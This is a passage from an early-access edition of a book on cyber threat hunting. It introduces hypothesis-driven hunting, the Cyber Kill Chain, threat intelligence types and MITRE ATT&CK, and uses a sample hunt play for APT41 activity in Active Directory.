



Cyber Threat Hunting MEAP V05
1. Copyright_2023_Manning_Publications
2. welcome
3. 1_Introduction_to_Threat_Hunting
4. 2_Building_the_Foundation_of_a_Threat_Hunting_Practice
5. 3_Your_First_Threat_Hunting_expedition
6. 4_Threat_Intelligence_for_Threat_Hunting
7. 5_Hunting_in_Clouds
8. 6_Using_Fundamental_Statistical_Constructs
9. 7_Tuning_Statistical_Logic
10. 8_Unsupervised_Machine_Learning_with_K-Means

    
MEAP Edition Manning Early Access Program Cyber Threat Hunting Version 5 
Copyright 2023 Manning Publications 
(c)Manning Publications Co. We welcome reader comments about anything in the manuscript - other than typos and other simple mistakes. These will be cleaned up during production of the book by copyeditors and proofreaders. https://livebook.manning.com/#!/book/cyber-threat-hunting/discussion
For more information on this and other Manning titles go to manning.com
welcome
Thanks for purchasing the MEAP of Cyber Threat Hunting. The book takes you through a journey to become a successful threat hunter. In this book, I share my experience of threat hunting to help you establish a practical threat hunting framework, understand the mindset of threat hunters, and live the hunting experience by conducting real-life threat hunt expeditions.
Throughout the book, we will be covering various data sources, data sets, and techniques to design and conduct threat hunting. We show how hunters can use standard searches, statistics, and machine learning as analytic techniques to conduct threat hunt expeditions.
I first take you through the fundamentals of threat hunting, how to build a practical threat hunting framework, and establish a maturity road for your threat hunting program.
I then take you through the process of conducting threat hunt expeditions using a scenario-based approach, covering different real-life topics and scenarios. You will get the opportunity to learn and practice threat hunting using different data sets and techniques. You will gain access to templates and processes that I hope will be of value to your career and inspiration as a threat hunter.
To get the best out of the book, you need to have basic knowledge and experience in managing security controls, networking concepts, operating systems, and performing searches in data stores.
Please let me know your thoughts in the liveBook discussion forum on what I wrote so far and what you would like to see in the rest of the book.
Thanks again for your interest and for purchasing the MEAP. Good luck, hunters!
Nadhem Al Fardan
In this book
Copyright 2023 Manning Publications welcome brief contents 1 Introduction to Threat Hunting 2 Building the Foundation of a Threat Hunting Practice 3 Your First Threat Hunting expedition 4 Threat Intelligence for Threat
Hunting 5 Hunting in Clouds 6 Using Fundamental Statistical Constructs 7
Tuning Statistical Logic 8 Unsupervised Machine Learning with K-Means

1 Introduction to Threat Hunting
The chapter introduces the Cyber Kill Chain and provides an overview of the cyber security threat landscape and how threat hunting can tackle complex cyber security challenges. The chapter describes the thought process behind threat hunting, laying down fundamental concepts of a successful threat hunting practice. The chapter draws the differences and highlights the similarities between threat hunting and threat detection. The chapter ends with an overview of the core tools that threat hunters use.
The book defines cyber threat hunting as follows:
Definition
Cyber threat hunting is a human-centric security practice that takes a proactive approach to uncover threats that evaded detection tools or threats that have been detected but dismissed or undermined by humans.
The chapter covers the following topics:
The stages of the Cyber Kill Chain
 How threat hunters uncover cyber threats that went unnoticed by detection tools, equipped with the right set of skillset and tools.  The similarities and differences between cyber threat hunters and farmers (security analysts) and how hunting and detection services complement each other.
The hypothesis-driven approach that the threat hunting process takes The characteristic of a successful threat hunter and a threat hunting practice
 The set of core tools that threat hunters require to conduct hunting expeditions
Let us start with an overview of the cybersecurity threat landscape and show why threat hunting is essential.
1.1 Cybersecurity Threat Landscape
Today's cyber threat landscape is complex, constantly evolving, and diverse. Threat actors, ranging from organized cybercrime to state-sponsored groups, actively improve existing attack techniques and tools and create new ones to reliably establish and quickly move through the Cyber Kill Chain (https://www.lockheedmartin.com/en-us/capabilities/cyber/cyber-killchain.html), starting from reconnaissance to actions on objectives.
The Cyber Kill Chain developed by Lockheed Martin, shown in Figure 1.1, describes the set of stages that adversaries typically go through to achieve their final objective(s). The Cyber Kill Chain consists of seven stages.
1. Reconnaissance: the attacker assesses the situation to identify potential attack targets and tactics. For example, an attacker harvests social media accounts or performs an active vulnerability scan on publicly accessible applications.
2. Weaponization: the attacker develops the code to exploit vulnerabilities or weaknesses that the reconnaissance stage uncovered. For example, preparing a phishing email, formulating a SQL injection code, or preparing malware code.
3. Delivery: the attacker uses the delivery vectors to send the weaponized payload. For example, an attacker uses email to deliver malware code.
4. Exploitation: the attacker executes the code she created in the weaponization stage.
5. Installation: the attacker creates a channel that allows her to reach the compromised system.
6. Command and Control: the attacker establishes a command-andcontrol channel (C2) with an external server. For example, an attacker uses Twitter as a covert command and control channel to communicate with compromised systems.
7. Actions on Objective: the attacker fulfills the objective(s) of the attack. For example, an attacker encrypts files on the endpoint in the case of a ransomware attacker.
Figure 1.1 Lockheed Martin Cyber Kill Chain

A popular meme in cyber security, credited to Dmitri Alperovitch, states, "there are only two types of companies: those that know they've been compromised, and those that don't know." Threat hunting allows organizations to take a proactive approach in which they assume that they have been hacked and can uncover evidence of that.
We now have some idea about the complexity of the security threat landscape; let us dig into essential concepts of threat hunting and describe its relevance and importance.
1.2 Why Hunt?
There is no perfect cybercrime. Adversaries would leave clues and a trail of evidence when executing one or more of the cyber kill chain stages.
Advanced adversaries have shifted from using noisy attacks that trigger security alarms to more stealthy ones that leave a small footprint and trigger minimal alerts, if any, going unnoticed by automated detection tools. According to a SANS published report (https://www.sans.org/webcasts/stopnasty-malware-pre-post-execution-review-ensilo-endpoint-security-platform106690), "the evolution of threats such as file-less malware, ransomware, zero days and advanced malware, combined with security tools getting bypassed, poses an extensional risk to enterprises."
The increased threat actors' sophistication in operating in covert nature and their ability to launch attacks with minimal chances of detection are driving organizations to think beyond their standard detection tools. The change in the adversary behavior requires defenders to establish proactive capabilities such as threat hunting and deploy advanced analytics using statistics and machine learning. For example, hunters can regularly search for potential data exfiltration activities through Domain Name Service (DNS) by applying volume-based statistical analytics without waiting or relying on network security tools such as intrusion detection systems to generate security alerts.
Organizations rely on the threat hunter's skills to uncover the above threats during threat hunt expeditions, resulting in reduced dwell time and increased cyber resilience. The dwell time is the time between an attacker's initial penetration of an organization's environment (threat first successful execution time) and the point at which the organization finds out the attacker (threat detection time).
In addition to reducing the dwell time, running threat hunting expeditions introduces other security benefits to the organization, such as
Identifying gaps in security prevention and detection capabilities
Tuning existing security monitoring use cases
Identifying new security monitoring use cases
Identifying vulnerabilities that assessment activities did not uncover Identifying misconfiguration in systems and applications, which might impact security, operation, and compliance
To capture the above list of benefits, organizations need to establish and operate a robust threat hunting process that clearly describes the threat hunting expeditions' inputs and outputs. The book helps you establish a robust threat hunting program using practical examples and providing templates.
Now that we established the need for a proactive approach to uncover cyber security threats let us describe how to structure a threat hunt.
1.3 Structuring Threat Hunting
Threat hunting takes a hypothesis-driven investigation approach. A hypothesis is a proposition that is consistent with known data but has been neither verified nor shown to be false. A good hypothesis should be relevant to the organization environment and testable in terms of the availability of data and tools. Taking a hypothesis-based approach is referred to as structured threat hunting.
On the other hand, unstructured threat hunting refers to activities in which hunters analyze data at their disposal to search for anomalies without a predefined hypothesis. For example, the hunter might process and visualize data to look for unexpected changes in patterns such as noticeable spikes or dips. Finding such changes can lead the hunter to investigate further to uncover undetected threats. In this book, we focus on structured threat hunting, but we do not discourage you from exploring data without a formal hypothesis from time to time.
The following is an example of a threat hunt hypothesis:
Hypothesis
An adversary has gained access to one or more of the organization's Microsoft Windows endpoints. PowerShell is one of the tools used by the adversary to perform unauthorized activities.
Now that we understand what a hypothesis is, let us discuss how to come up with one.
1.3.1 Coming up with a Hypothesis
The threat landscape associated with the environment you try to protect should drive what hypothesis to create and execute. Different sources concerning threats and their relevance to the environment can assist you in understanding the threat landscape. Threat hunters translate this understanding to hypotheses. The following are examples of such sources:
Internal and external threat intelligence sources
The results of threat modeling exercises
The results of red team exercises
Reviewing existing threat standards and frameworks such as MITRE
ATT&CKT(r)
 Analysis of previous or current security incidents
1.3.2 Testing the Hypothesis
It is the job of the threat hunter to test the hypothesis using the best resources available at the hunter's disposal. Testing the hypothesis can start by defining a manageable list of activities that can uncover the first set of evidence or indicators concerning the hypothesis or guide the hunters to subsequent searches. For example, the following activities are relevant to the previously stated hypothesis.
Hunting for suspicious PowerShell activities could reveal the existence of the compromise, proving the hypothesis. The successful execution of the following may uncover evidence of compromise:
1. Suspicious encoded PowerShell command
2. Suspicious execution of unsigned PowerShell scripts without warning
3. A process with suspicious PowerShell arguments
4. Suspicious PowerShell parent process
When conducting a hunt, there are three possible outcomes
1. Hypothesis proven: the analysis of the data collected during the hunt expedition confirms the correctness of the hypothesis. In this case, the hunt expedition uncovered a security incident.
2. Hypothesis disproven: the analysis of the data collected during the hunt expedition confirms the incorrectness of the hypothesis. In this case, the hunt expedition could not uncover a security incident.
3. Inconclusive: there is still insufficient information to either prove or disprove the hypothesis. This outcome could be due to various reasons such as insufficient data, inappropriate tools, and scope limitations.
1.3.3 Executing the Threat Hunt
Executing a threat hunt might take an hour or might go for a week, depending on several factors such as:
1. Initial suspicious activities: the number of initial use cases to execute in search for the first set of clues
2. Data: the amount of data to search in, the complexity of the search, and the tools' performance. For example, running a search against 1TB of data on hot storage (disks with high input/output operations per second) would be much faster than running the exact search on cold storage (disks with low input/output operations per second).
3. Threat complexity: sophisticated attacks might be associated with the like of Advanced Persistent Threats (APTs) that require a longer time, which might, in many cases, takes weeks or even months to investigate thoroughly. This is not to say that the hunt will last for months, but to state that the hunt part would take longer than average.
4. Access to data and systems: not gaining timely access to systems or data in the middle of a hunt expedition can prolong the hunt duration. For example, not providing the hunter timely access to the available network flows maintained by a different team would waste time and force the hunter to eventually wait or find more expensive and less reliable options or end with an inconclusive hunt outcome.
Failing to prove the hypothesis does not necessarily mean that the threat does not exist. It means that the hunter could not uncover the threat with the skillset, data, and tools available.
The book focuses on structured that hunting, in which the threat hunter, working with other security team members to define and prove a hypothesis, targeting adversaries' Tactics, Techniques, and Procedures (TTPs).
The organization's threat hunting maturity level should improve over time. There are many lessons the hunter will learn from the hunt expeditions. The book provides practical lessons on how to plan, build and operate an effective threat hunting program.
Now we have a good idea about threat hunting; let us compare it with threat detection, a fundamental security monitoring service, and draw differences and highlight similarities.
1.4 Threat Hunting vs Threat Detection
Detection is tool-driven, while hunting is human-driven. In hunting, the hunter takes center stage, compared to tools having that role in the world of detection. Threat hunting relies heavily on the experience of the threat hunter for defining the hypothesis, looking for evidence in a vast amount of data, and continuously pivoting in search of the evidence of compromise. Threat hunting does not replace threat detection technologies; they are complementary.
Threat detection refers to the reactive approach in which Security Operation Center (SOC) analysts respond to security alerts generated by tools. For example, SOC analysts would triage and investigate a security event generated by an Endpoint Exposure and Response (EDR) tool or a security alert generated by a Security Event and Information Management (SIEM) system.
SOC analysts attend to security alerts detected and reported by security tools and perform triage and investigation of security incidents. Figure 1.2 shows at a high level the threat detection process, in which SOC analysts would primarily perform cyber threat farming. Like farmers, SOC analysts generally wait for alerts (ripe crops) to show up on a dashboard to triage and respond to (harvest and process.) On the other hand, hunting takes a proactive approach. Hunters take the lead by going out in the hunting field to conduct expeditions, equipped with the right mindset, experience, situational awareness, and the right set of tools they require for an expedition.
Figure 1.2 Threat Detection High-Level Process

Detection is an essential SOC service. Addressing deficiencies in the security monitoring service should be a top priority while establishing or outsourcing a threat hunting capability. Organizations should not consider establishing a threat hunting program to offload the work from the security monitoring team to threat hunters.
Detection and hunting should work together to deliver a better coverage of the cyber threat landscape. Detection and hunting interact and, in some instances, overlap. There will always be cases where detection is an input to a threat hunt and vice versa. For example, a threat hunter might build a hypothesis that considers a widespread system compromise based on few suspicious activities detected on one or more endpoints and observed by the security monitoring team.
Detection and hunting can use the same or different analytic techniques to detect or hunt for malicious activities. For example, user behavior analytic tools deploy statistical analysis and machine learning to detect and report anomalous user behavior to the security monitoring team. Hunters can make use of similar techniques for cyber threat hunting. Although hunters would not lead the development of machine learning models, they must understand and apprehend the capabilities and limitations of the different analytic techniques.
Threat hunters are highly skilled resources. Let us have a look at the set of skills that threat hunters possess.
1.5 The Background of a Threat Hunter
A threat hunter is a cyber security specialist who proactively and interactively seeks to uncover attacks or threats that evaded detection technologies deployed in various places in the network.
Successful threat hunters are curious, prepared to tackle new challenges, and equipped with a good understanding of their hunting field. As a threat hunter, you will face challenges such as the unavailability of data, slow searches, improper event parsing, old technologies, incomplete or not access systems. The hunter should raise these challenges during and after a hunt expedition. Some of these challenges might get addressed in a reasonable time, while others might take a long time or might not get addressed at all, especially ones that involve financial investments. These challenges should not prevent the hunters from finding new ways to enhance the effectiveness of the threat hunts by looking at other data and systems and tune the techniques the hunter deploys. Hunters are resourceful.
An offensive mindset gives the hunter an advantage in creating effective threat hunt plays and executing threat hunt expeditions.
During a hunt expedition, not being able to prove the hypothesis should not discourage a hunter. It is a common outcome that can be due to various reasons, including
 The attack or the threat described in the hypothesis does not exist in the first place
 The Hunter might not yet have the full context about the environment. For example, running a threat hunt against a newly deployed set of systems and applications might prove to be challenging when running the hunt.
 The Hunter might not yet have the skill set required to uncover sophisticated attacks against technologies that the hunter is not very familiar with. For example, running a threat hunt expedition against a private Kubernetes environment while the hunter is unfamiliar with containerized deployments.
Lack of data required to the hunter to perform better investigations The use of inappropriate techniques to uncover sophisticated attacks. For example, running basic searches to uncover advanced persistent threats (APTs) have their limitations.
As a threat hunter, you cannot be expected to know everything. Successful threat hunters spend an ample amount of time to research and, in many cases, try new Tactics, Techniques, and Procedures (TTPs.) Cyber security is a dynamic landscape, and having valuable research time would enhance the chances of uncovering advanced TTPs.
As a threat hunter, understanding the threat hunting process is essential. Let us take a look at the threat hunting process.
1.6 Threat Hunting Process
Defining a process helps threat hunters establish, conduct, and continuously improve the overall threat hunting practice and the individual threat hunt plays, increasing, over time, the probability of uncovering threats. Not only does it help improve the quality of threat hunts, but the process also incorporates other values that threat hunting introduces to the organization, such as updating existing or developing new detection and threat intelligence content.
Figure 1.3 shows in a high-level the threat hunting process, which starts by formalizing a hypothesis, followed by trying to prove the hypothesis. If the hunter could not prove the hypothesis, then try to improve it by updating the hypothesis details and searching again for the threat. If proven, then the threat has been uncovered. The hunter does not stop there; expand the scope and search for indicators on other systems to understand the attack's magnitude and spread. The hunter would then engage the incident response team and document and share new content that would be helpful to the security monitoring and threat intelligence team.
Figure 1.3 Threat Hunting High-Level Process

The following are the threat hunting process steps:
 Formulate a hypothesis: define the hypothesis based on inputs collected from sources and activities such as threat modeling outcomes, TTPs received from internal and external threat intelligence providers, or simply searching for tactics and techniques described in standard frameworks such MITRE ATT&CKT(r). For example, the organization's threat intelligence team might track adversary groups such as APT 29 (https://www.fireeye.com/current-threats/apt-groups.html), targeting Western European governments, foreign policy groups, and similar organizations. The hunter can formulate hypotheses based on relevant tactics and techniques deployed by the group. Before moving into the next step, the hunter needs to answer the following questions:
 What activities does the threat hunter need to look for to prove the hypothesis?
What data does the threat hunter need to access?
How big is the data?
How much time will the searches take? How can the threat hunter, with the help of platform specialists, optimize the searches?
What tools should the threat hunter use?
Look for it in the environment: search for indicators and evidence that can prove the hypothesis
 If not proven, optimize and go back: optimize the threat hunt by increasing the scope of the hunt, requesting further access to data to systems, updating the search activities, or updating the hypothesis itself.  If proven, pivot and expand the scope: The hypothesis is proven. The hunter researches the extent of the security incident by expanding the scope of the hunt.
 Improve existing or develop new detection and threat intelligence content: now that the hypothesis is proven, the threat hunter may recommend new security monitoring detection rules and updates the threat intelligence content by sharing indicators or TTPs.
 Engage the incident response team: now that the hypothesis is proven, raise a ticket and assign it to the team that handles the incident response. Depending on the complexity of the incident, the hunter would provide support to the incident handling team.
Note
In Chapter 2, we present and describe a detailed version of the hunting process.
Note
It is important to note that although structured hunting involves following an initial lead or clue, hunters should expect many pivots and side quests.
Now that we understand the threat hunting process let us examine the tools used to execute the "look for threat in the environment" step.
1.7 Overview of Technologies and Tools
Although threat hunting is human-centric, having access to relevant and reliable technologies and scalable and flexible tools is critical to the success of the threat hunter. Events and activities can be collected from endpoints and network elements and forwarded to data stores to be accessed and searched.
Alternatively, the hunter might require access to artifacts and events directly from data sources to perform search and investigation activities.
Core technologies and tools that hunters would have in their toolset
 Endpoint activities on servers and clients: access to process executions, network ports, registry details (in Windows), and system access events is a standard requirement for most hunts, whether for initial use cases or during a hunt. OSQuery is an example of a tool that provides threat hunters with access to various endpoint telemetry data. The tool allows the hunter to write Structured Query Language (SQL) queries to explore operating system data. Some of the open-source and commercial EDR tools have similar built-in capabilities.
 Datastores: a place that provides long-term events storage and searches. For example, it is common to send events collected from different sources in the network to a data store such as Splunk or Elasticsearch, which are available to the security monitoring team and threat hunters.  Analytics: facilitates scalable searches with tools such as Splunk or Elasticsearch or advanced functions such as statistics and machine learning with platforms such as Apache Spark.
Depending on the environment and the scope of the hunt, the hunter's toolset would contain other tools. For example, a hunter might use YARA rules to research and capture suspicious activities on endpoints or push snort rules to network security tools such as intrusion detection systems to capture network activities of interest.
The book describes and provides examples of different open-source and commercial tools that threat hunters use and how to utilize the tools to conduct threat hunts.
1.8 Summary
Structured threat hunting is a hypothesis-driven practice that proactively tries to uncover threats that were not detected or threats that have been detected but dismissed or undermined by humans. Understanding the mindset of a threat hunter and the threat hunting process is crucial to becoming a successful threat hunter.

2 Building the Foundation of a Threat Hunting Practice
This chapter covers
How to develop a threat hunting hypothesis
How to document a threat hunt play
The importance of threat intelligence to threat hunting
Building a threat hunting framework
The detail of the threat hunting process
Threat hunting role and responsibilities
Important frameworks and standards
How to evaluate the maturity of a threat hunting practice
In Chapter 1, we established foundational threat hunting concepts. In this chapter, we discuss how to create a threat hunting framework. We start with an overview of existing frameworks and standards and how and where they cover the topic of threat hunting. For example, we discuss how and where a standard like NIST Special Publication 800-53 Rev 5 covers threat hunting and how a framework like MITRE ATT&CK can be used to establish hunts based on threat tactics, techniques and procedures.
We then describe how to start a hunting practice and improve its maturity over time, supplying you with processes and templates to kickstart the work. We then describe the general role and responsibilities of the threat hunter using a responsible, accountable, consulted, and informed model.
Finally, we describe data sources and their importance to threat hunting and provide an overview of common data sources and sets such as Windows events, Sysmon, Linux events, network flows and firewall events.
Let us start by defining essential concepts and roles that we would refer to in this chapter and the rest of the book.
2.1 Threat Hunting Definitions
 Threat hunting is a human-centric security practice that takes a proactive approach to uncover threats that evaded detection tools such as automated, rule- and signature-based security systems or threats that have been detected but dismissed or undermined by humans.
 A hypothesis is a proposition that is consistent with known data but has been neither verified nor shown to be false.
 A threat hunter is a role taken by a cyber security specialist who proactively and interactively seeks to uncover attacks or threats that evaded detection technologies deployed in various places in the network.
 Situational awareness refers to understanding the business, the supporting technology environment and the internal and external cyber threats associated with this environment.
 A threat actor refers to a person, a group or an organization driven by different motives to conduct malicious intents.
Now that we have defined some essential threat hunting-related concepts and roles, let us construct our first hunt play.
2.2 Developing a Threat Hunting Hypothesis
A hypothesis is a proposition that is consistent with known data but has been neither verified nor shown to be false. To start a structured hunt, you should first determine what to hunt for and what format to use to describe it, i.e., answer the question "how to come up with a reasonable hypothesis and how to document a threat hunt play?"
2.2.1 Threat Scenario
Imagine the threat intelligence team sharing with you that a threat group referred to as APT41 is now a top actor in their threat watchlist. Construct a threat hunt play to uncover this group's activities when using shell-based techniques against Microsoft Active Directory (AD).
Note
This scenario considers a known threat actor that the threat intelligence team considers relevant to the environment. There will be other cases in which the actors and campaign are unknown, and you would rely on your experience, data, and tools to uncover them. It takes time to build maturity, so let us start with this scenario.
2.2.2 The Threat Hunt Play
We need to create a threat hunt play, such as the example that will shortly follow. The threat hunt play documents the following: title, reference number, background about the organization and the hunt play, the hypothesis that we try to test, the scope of the hunt, the techniques that we would start with to trigger the hunt, along with the associated procedures and data sources, and internal and external references relevant to the hunt play. Let us look at the example.
Title: Hunt for APT41 activities in the Microsoft AD environment
Reference Number: Hunt-Play-APT41-01
Background: An organizational threat assessment identified APT41 as a high-priority threat. The MITRE's ATT&CK Navigator details several techniques attributed to this threat actor. Several of these techniques are relevant to the organization's Microsoft Active Directory (AD) environment.
 Hypothesis: We hypothesize that the APT41 threat actor is present in the network and that we would detect evidence of multiple techniques deployed in a manner consistent with the group's attack patterns.  Scope: The scope of the hunt covers the Microsoft AD servers and other systems that make use of the Microsoft AD services.
Threat Technique:
MITRE ATT&CK T1059.001: Command and Scripting Interpreter:
PowerShell
 Procedure: APT41 leveraged PowerShell to deploy malware families in victims' environments.
 Data sources and events: Command/Command Execution,
Module/Module Load, Process/Process Creation (Security Auditing
     event 4688 and Sysmon event 1) and Script/Script Execution Threat Technique:
MITRE ATT&CK T1059.003: Command and Scripting Interpreter:
Windows Command Shell
 Procedure 1: APT41 used cmd.exe /c to execute commands on remote machines. APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.
 Data sources and events: Command/Command Execution, and
     Process/Process Creation (Security Auditing event 4688 and Sysmon event 1) References:
MITRE ATT&CK on APT41
(https://attack.mitre.org/groups/G0096/)
 Insikt Group. (2021, February 28). China-Linked Group RedEcho Targets the Indian Power Sector Amid Heightened Border Tensions. Retrieved March 22, 2021.
 APT41 group assessment report developed by the organization's threat intelligence team
Figure 2.1 Threat Hunt Play Example

Considering the threat scenario and the sample hunt play we created, let us look at how to design, construct and document a threat hunt play.
2.2.3 Formalizing the Hunt Hypothesis
To start a structured hunt, you should first determine what to hunt for and what format to use to describe it, i.e., answer the question "how to come up with a reasonable hypothesis and how to document a threat hunt play?" The hypothesis is at the center of structured threat hunting. It states what threats may be present in the network and how to identify them. The number of hypotheses should grow over time as the threat hunter gains better knowledge of the environment, i.e., better situational awareness, consumes better threat intelligence information that facilitates the creation of new threat hunts, or simply as the number of applications and systems grows.
Over time, some threat hunts might transition to security detection rules. In addition, there will also be cases in which some hunts might become obsolete, for example, after decommissioning an application or a system.
The hunter should consider the following attributes when developing a hypothesis:
 Relative: the hypothesis should be relevant to the environment. The hunter should apply situational awareness and domain expertise to drive the development and testing of a hypothesis. Situational awareness is gained over time, adding to the threat hunter's experience and driving better threat hunt design and execution. In our scenario, the threat hunter should be familiar with how Microsoft AD works in general and its security aspects in specific (domain expertise) and with the current deployment of Microsoft Active Directory in the environment (situational awareness).
 Testable: it should be possible to test the hypothesis using the data and tools available for the hunter. In our scenario, the hunter needs access to the operating system and Microsoft AD events and tools that collect and store these events so that the hunter can at least search for them.
The following is a format that you can use to document a threat hunting play. The format consists of the following:
 Background about the threat hunt, including information about the threat and hunt field in scope.
 A statement that describes the threat, hypothesizes that the threat exists and that the threat hunter can uncover it.
The scope of the threat hunt describes the hunt field.
A list of techniques and indicators to look for to reveal the existence of the threat actor. Select relevant techniques, combining information about the threat actor and the threat hunter's experience and knowledge about the environment. The threat hunter may identify corresponding MITRE ATT&CK techniques and sub-techniques if applicable to the hypothesis.  The procedures used by the adversary to realize the techniques reveal the existence of the threat actor. There could be multiple procedures mapped to one technique.
 The list of data sources and sets required to test the hypothesis based on the techniques and procedures identified.
 A reference section that lists internal or external documents, blogs, artefacts relevant to the threat hunt play.
In our scenario, the threat intelligence team provided the threat hunter with a good reason to establish one or more threat hunt plays relevant to a threat group of interest, APT41, one of many active threat actors.
Threat intelligence is an important source that provides critical insights to threat hunters understanding of the current threat landscape. In our scenario, it is the threat intelligence team sharing the information about the relevance of a threat group, APT41, as one of the threat actors to track. Let us further describe threat intelligence and how it relates to threat hunting.
2.3 Cyber Threat Intelligence
Cyber Threat intelligence refers to the information collected and processed and knowledge established around cyber threats by internal and external sources to better understand and evaluate the threats that have, will, or are currently targeting an organization, allowing it to take actions and make informed decisions promptly. Cyber threat intelligence tries to help answer simple but important questions such as: who would attack an organization and how?
"Who would attack the organization, and how?" are questions that threat intelligence analysts try to answer. To that, they research, analyze and compile a wide range of internal and external information to identify shortterm (present) and long-term (future) attacks and threats. Threat intelligence analysts then share the compiled version with the broader organization, including threat hunters.
2.3.1 Threat Intelligence Types
Based on its content and how it is consumed, threat intelligence is divided into four types: strategic, tactical, technical, and operational. The four types are shown in Figure 2.2 and described hereafter.
 Strategic cyberthreat intelligence supplies a high-level presentation of the threat landscape suitable for executives, focusing on the impact of threat execution.
 Operational threat intelligence provides context about threats and actors such as nature, intent, malicious activities and geopolitical background suitable for security management members. Operational threat intelligence provides threat hunters with the contextual information that help them build and execute relevant hunt plays.  Tactical threat intelligence supplies details on TTPs suitable for the SOC team in general and threat hunters in specific.
 Technical threat intelligence supplies specific IOCs such as IP addresses, hashes, and URLs suitable for machine-based consumption. Due to the nature of the information it provides, technical threat intelligence has a short lifespan.
Figure 2.2 Threat Intelligence Types

Threat hunters should have an overall knowledge of the four threat intelligence types, focusing on operational and tactical threat intelligence and easy access to technical threat intelligence.
Let us now look into how to view and process tactical and technical threat intelligence based on their level of complexity through the lens of the pyramid of pain model.
2.3.2 The Pyramid of Pain
The pyramid of pain model (http://detect-respond.blogspot.com/2013/03/thepyramid-of-pain.html), shown in Figure 2.3, takes a complexity-driven perspective on tactical and technical threat intelligence. The higher you go on the pyramid, the harder it gets to uncover the attacker's characteristics. For example, locating and tracking the activities of an IP address is generally easier compared to uncovering the use of techniques such as invoking rundll32.exe to execute a malicious loader.
A mature threat hunting practice would focus on the top three layers of the pyramid of pain (network/host artifacts, tools and TTPs) to get the best value out of threat intelligence and achieve higher levels of maturity. The bottom three layers of the pyramid (hash values, IP addresses and domain names) are associated with IOCs mainly consumed for security monitoring purposes. Threat hunters would still use these IOCs, but that should not be the focus of the threat hunting practice as a whole.
Figure 2.3 Pyramid of Pain

In addition to threat intelligence, situational awareness is key to creating relevant hypotheses. Let us dig more into the concept of situational awareness.
2.4 Security Situational Awareness
In the context of cyber security, situational awareness refers to understanding
1. the business, 2. the supporting technology environment that security professionals, such as hunters, aim to protect and 3. the internal and external cyber threats associated with this environment.
Maintaining good situational awareness is critical to making informed security decisions when selecting, deploying and operating threat prevention, detection, and response controls. In the context of threat hunting, situational awareness is key to creating and conducting relevant and effective threat hunts.
To gain better situational awareness, threat hunters should establish knowledge on:
 The organization's business, including the market it operates in and the products and services it offers to customers.
 The technology services delivered by the organization to its internal and external consumers. For example, user directory or remote access services.
 Systems and applications used, including and not limited to the operating systems and software used.
 The location of these systems and applications. For example, the ones hosted in an on-premises data center or ones delivered by a cloud service provider as infrastructure as a service (IaaS), platform as a service (PaaS) or software as a service (SaaS).
 Existing prevention, detection and response security controls, including and not limited to network security, application security, endpoint security, infrastructure security, identity management and vulnerability management.
 Data generated by the different systems and applications, where they are stored and how they can be accessed.
 The threat landscape associated with the environment, including relevant threat actors and TTPS that could be used or enhanced to start an attack or establish a compromise.
 Previous and current security incidents
The combination of 1. good situational awareness, 2. the threat hunter's experience and 3. a structured and well-resourced practice is key to reaching a good level of threat hunting maturity.
There are situations when the threat hunting experience might hinder the productivity and effectiveness of threat hunts. This is due to cognitive biases, which refers to how humans' perception of information is influenced by their own experience and preferences. Let us discuss this in more detail in the next section.
2.5 Cognitive Bias Challenges
According to the Handbook of Evolutionary Psychology, a cognitive bias is a systematic pattern of deviation from norm or rationality in judgment. Experiencing cognitive biases results from how our brains are wired to simplify our complex world.
We all exhibited and will exhibit one form or another of cognitive biases. Security professionals such as threat hunters should be aware of how cognitive biases impact their decisions and judgment. There is a long list of cognitive biases. The following are three critical ones that threat hunters should observe and try to overcome when designing and conducting hunts.
 Confirmation bias: refers to the tendency to search for or interpret information in a way that confirms one's preconceptions and discredit information that does not support the initial opinion. Threat hunters should not fall into confirmation bias by ignoring or discarding information or suggestions contradicting their hypothesis. This will save them time and ensure that their threat hunts are relevant and optimal and that the outcome of the hypothesis testing reflects the actual situation.  Present bias: refers to choosing a smaller present reward that is immediate than waiting for a more significant future one in a trade-off situation. Threat hunters should not settle for the first evidence they uncover. Instead, they should expand the scope of the hunt to uncover the extent of the threat.
 Overconfidence bias: refers to overestimating one's actual ability to perform a task successfully. Threat hunters should continuously seek to gain more experience and knowledge to be accurately self-confident rather than overestimate their capabilities. The overconfidence bias might stop threat hunters from seeking advice or support from other experienced colleagues or external subject matter experts, thinking they know all.
At the beginning of the chapter, we referred to MITRE ATT&CK in our threat hunt play that addresses the threat scenario. For example, we referenced MITRE ATT&CK in the background section and a couple of MITRE ATT&CK techniques (T1059.001 and T1059.003) under the threat techniques. What is MITRE ATT&CK, and how useful is it to threat hunters? We explore this in the next section.
2.6 MITRE ATT&CK
MITRE ATT&CK (https://attack.mitre.org) stands for MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK). MITRE
ATT&CK is a popular reference for creating security monitoring detection rules and driving threat hunting hypotheses. It provides comprehensive matrices of attack and threat tactics and techniques that are updated twice a year. Version 10, published in October 2021, has four matrices: Enterprise, Mobile, Industrial Control System, and Containers.
Version 10 of MITRE ATT&CK Enterprise
(https://attack.mitre.org/resources/updates/updates-october-2021) contains 14 Tactics, 188 Techniques, 379 Sub-techniques and 129 Groups. The 14 tactics are Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Credential, Access, Discovery, Lateral, Movement, Collection, Command and Control, Exfiltration and Impact.
ATT&CK describes the following elements:
 Tactics: represent the "why" of an ATT&CK technique or subtechnique. It is the adversary's tactical goal, i.e., the reason for performing an action. For example, exfiltrating data.
 Techniques: represent "how" an adversary achieves a tactical goal by performing an action. For example, an adversary may dump credentials to achieve credential access. The threat hunt play example includes technique number T1059, command and scripting interpreter, under the execution tactic.
 Sub-techniques: a specific description of the adversarial behavior used to achieve a goal. They describe behavior at a lower level than a technique. The threat hunt play example includes two sub-techniques: T1059.001, command and scripting interpreter: PowerShell, and T1059.003, Command and Scripting Interpreter: Windows Command Shell.
 Procedures: the specific implementation the adversary uses for techniques or sub-techniques. The threat hunt play example includes a procedure per sub-technique. For example, APT41 leveraged
PowerShell to deploy malware families in victims' environments is used for Command and Scripting Interpreter: PowerShell sub-technique and used cmd.exe /c to execute commands on remote machines. APT41 used a batch file to install persistence for the Cobalt Strike BEACON loader.
The threat intelligence community tracks threat actors and, in many cases, maps their activities to the MITRE ATT&CK tactics and techniques. Organizations and threat hunters can use this information to plan their hunts. For example, APT41 (Mandiant - https://www.mandiant.com/resources/aptgroups) is a group that is also known as Wicked Panda (CrowdStrike https://adversary.crowdstrike.com/en-US/adversary/wicked-panda), Group 72
